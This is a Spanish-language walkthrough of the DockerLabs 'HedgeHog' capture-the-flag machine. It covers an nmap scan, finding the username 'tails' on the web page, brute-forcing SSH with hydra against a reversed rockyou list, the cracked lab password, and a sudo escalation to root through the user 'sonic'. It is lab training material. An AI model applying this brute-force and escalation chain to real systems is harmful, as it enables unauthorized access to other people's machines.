 HedgeHog-DockerLabs🇪🇸 

**1. Primero vamos a descomprimir los ficheros que nos facilita la practica.**
```bash
unzip hedgehog.zip 
```

<img width="839" height="111" alt="image" src="https://github.com/user-attachments/assets/6f6d62e2-b439-428a-a1ff-4301fb2db67a" />

**2. Procederemos a iniciar la máquina.**
```bash
sudo bash ./auto_deploy.sh hedgehog.tar
```

<img width="960" height="503" alt="image" src="https://github.com/user-attachments/assets/02b942e0-ad3d-47b9-b462-96fde0c8908c" />

**3. Vamos a comprobar la comunicación con un ping**
```bash
ping -c3 172.17.0.2
```

<img width="951" height="352" alt="image" src="https://github.com/user-attachments/assets/48d97ba9-99c9-42a9-b52c-20a98a4ad236" />


**4. Ahora vamos a rastrar los puertos que esten libres con un nmap, podremos ver que están libres los puertos 22 y 80.**
```bash
nmap -sCV 172.17.0.2
```

<img width="951" height="509" alt="image" src="https://github.com/user-attachments/assets/fb74211d-9d74-4272-9886-6379e488de91" />

**5. Ahora iremos a la web y veremos que pone tails**

<img width="962" height="297" alt="image" src="https://github.com/user-attachments/assets/44edba0e-da1a-41af-9b0c-57a59469665b" />


**6. Ahora sabiendo el usuario trataremos de realizar un hydra.**

<img width="944" height="262" alt="image" src="https://github.com/user-attachments/assets/b5190cdd-8604-433b-9645-df6d230b20a4" />

**6.1 Dado de que no vamos a esperar 1160 horas deberemos de adaptar la lista empezando desde abajo con tac y ejecutando 4 consultas colocandolo al final del comando de hydra.**
```bash
tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > /tmp/rockyou-rev.txt
hydra -l tails -P /tmp/rockyou-rev.txt ssh://172.17.0.2 -t 4
```

<img width="957" height="272" alt="image" src="https://github.com/user-attachments/assets/7d8f756c-f5ca-4caf-b0b7-c66998a626cf" />

**7. Ahora teniendo la contraseña proporcionada por hydra entraremos mediante ssh.**
```bash
 ssh tails@172.17.0.2
# passwd: 3117548331
```


<img width="938" height="331" alt="image" src="https://github.com/user-attachments/assets/ad291256-6f17-475f-8fdb-e34933286d56" />

**8. Ahora dentro de la máquina deberemos de escalar los privilegios. Primero veremos con sudo -l que binarios tenemos de privilegios.**
```bash
sudo -l
```

<img width="942" height="95" alt="image" src="https://github.com/user-attachments/assets/0fd32f98-cfef-43de-9b25-19930b74702b" />

**9.Viendo que tenemos acceso a los comandos sonic entraremos, con sonic podremos ejecutar cualquier comando.**
```bash
 sudo -u sonic bash
sudo su
```


<img width="960" height="136" alt="image" src="https://github.com/user-attachments/assets/62078b20-e541-4b49-8594-fab2ac72f2fd" />
